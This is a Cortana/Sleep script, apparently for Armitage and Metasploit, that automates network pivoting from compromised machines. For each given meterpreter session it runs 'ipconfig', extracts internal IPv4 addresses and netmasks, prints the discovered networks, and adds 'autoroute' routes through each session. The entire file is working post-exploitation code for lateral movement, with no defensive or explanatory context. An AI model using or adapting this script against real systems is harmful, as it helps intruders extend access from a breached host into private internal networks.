debug(7);

on ready {
   #println("ready");
}

command arguments {
   local('@sessions');
   @sessions = split(';', $1);
   #println("arguments");
   fire_event_local("networkSearch", @sessions);
}

on networkSearch {
   local('$console $session @sessions @ips @masks %networks @info $sid $line @output $temp $host $net');
   $console = console();
   @sessions = $1;

   on("meterpreter", $this);

   foreach $session (@sessions) {
      @info = split(",", $session);

      $sid = @info[0];
      cmd($console, "sessions -i $sid");
      m_cmd($sid, "ipconfig");
      yield;

      @output = split('\n', $3);
      foreach $line (@output) {
         if ($line hasmatch 'IPv4') {
            if ($line hasmatch 'Address') {
               $temp = substr(split(":", $line)[1], 1);
               push(@ips, $temp);
               if ((size(@ips) - size(@masks)) == 2) {
                  push(@masks, "");
               }
               while ($line hasmatch 'Address') {};               
            }
            if ($line hasmatch 'Netmask') {
               $temp = substr(split(":", $line)[1], 1);
               push(@masks, $temp);
               while ($line hasmatch 'Netmask') {};
            }
            while ($line hasmatch 'IPv4') {};
         }
      }
      %networks = addNetworks(%networks, @ips, @masks, @info[1]);
      @ips = @();
      @masks = @();
   }

   foreach $host (%networks) {
      foreach $net (%networks[$host]) {
         println("$net");
      }
   }
   addPivots(%networks, @sessions);
   cmd($console, "jobs -K");
   quit();
}

sub addNetworks {
   local('%networks @ips @masks $host $i $entry');
   %networks = $1;
   @ips = $2;
   @masks = $3;
   $host = $4;

   for ($i = 0; $i < size(@ips); $i += 1) {
      if (@ips[$i] ne "127.0.0.1" && @ips[$i] ne $host) {
        
         if ($host in %networks) {}
         else {
            #println("added new host: $host");
            %networks[$host] = @();
         }
         $entry = @ips[$i] . "," . @masks[$i];
         push(%networks[$host], $entry);
      }
   }

   return %networks;
}

sub addPivots {
   local('$console %networks @sessions $session @info $sid $host $net');
   $console = console();
   %networks = $1;
   @sessions = $2;

   on("meterpreter", $this);

   foreach $session (@sessions) {
      @info = split(",", $session);
      $host = @info[1];

      if ($host in %networks) {
         $sid = @info[0];
         cmd($console, "sessions -i $sid");
         foreach $net (%networks[$host]) {
            m_cmd($sid, "run autoroute $net ");
            yield;
         }
      }
   }
}